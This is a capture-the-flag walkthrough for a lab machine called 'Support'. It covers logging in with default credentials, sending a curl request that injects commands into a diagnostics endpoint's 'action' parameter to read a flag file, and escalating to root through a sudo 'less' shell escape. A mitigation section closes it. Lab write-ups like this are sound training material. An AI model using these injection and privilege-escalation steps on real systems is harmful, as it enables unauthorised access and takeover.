---
title: "Writeup: Support"
date: "2026-04-08"
author: "Dock & Root"
tags: ["Writeup", "Command Injection", "Weak Credentials", "Sudo", "Easy"]
thumbnail: "../img/unnamed.png"
---

# Writeup: Support

This walkthrough details the exploitation of the **Support** machine, dealing with weak default credentials leading to Command Injection on an administrative dashboard, and finishing with a simple Sudo privilege escalation.

## 1. Enumeration

Scanning the target machine reveals a Node.js Express server running on port 8003.

```bash
nmap -sV -sC 127.0.0.1 -p 8003
```

Navigating to the web page, we find an "IT Support Portal" login page. Trying common default credentials like `admin:admin` or `admin:password` grants us immediate access. The correct credentials turn out to be `admin:password`.

## 2. Analyzing the Web Application

Once authenticated, we are redirected to a "System Diagnostic Center" dashboard. The dashboard features a dropdown menu allowing operators to run `netstat -ant` or `ps -ef`. 

If we inspect the HTML form, we notice it submits the raw command string in the `action` parameter of a POST request:
```html
<option value="netstat -ant">List Connections</option>
```

## 3. Exploitation (Remote Code Execution)

Since the application appears to directly execute the value of the `action` parameter without validation, we can attempt to inject our own commands. 

We intercept the POST request to `/diagnostics` using a tool like Burp Suite or curl, and modify the `action` parameter:
```bash
curl -X POST http://127.0.0.1:8003/diagnostics -H "Cookie: auth=admin" -d "action=cat /home/support_user/user.txt"
```

**Output Response:**
```html
<h2>Result for: cat /home/support_user/user.txt</h2>
<pre>HTB{support_portal_compromised}</pre>
```

We now have remote code execution and our user flag! We can easily upgrade this to a full interactive reverse shell.

## 4. Capturing the Flag (Sudo Privesc)

With initial access as `support_user`, we check for available sudo privileges:
```bash
sudo -l
```

**Output:**
```text
User support_user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/less
```

The user is allowed to run `/usr/bin/less` as root without a password. The `less` utility has a well-known feature that allows users to execute shell commands from within the pager by typing `!`.

We run:
```bash
sudo less /etc/profile
```

Once inside `less`, we type `!sh` and hit Enter. We are instantly dropped into a root shell!

```bash
# cat /root/root.txt
HTB{sudo_less_is_more_privesc}
```

---

## 🛡️ Mitigation & Patching

1. **Authentication:** Never use default or easily guessable credentials. Enforce strong password policies.
2. **Command Injection:** Avoid using `exec()` or `eval()` with user-supplied data in Node.js. Use `child_process.spawn()` or `execFile()` with strictly defined arguments.
3. **Privilege Escalation:** Be extremely cautious when granting `NOPASSWD` sudo rights, especially for programs like `less`, `awk`, `find`, or `vi` which offer interactive shell escapes.
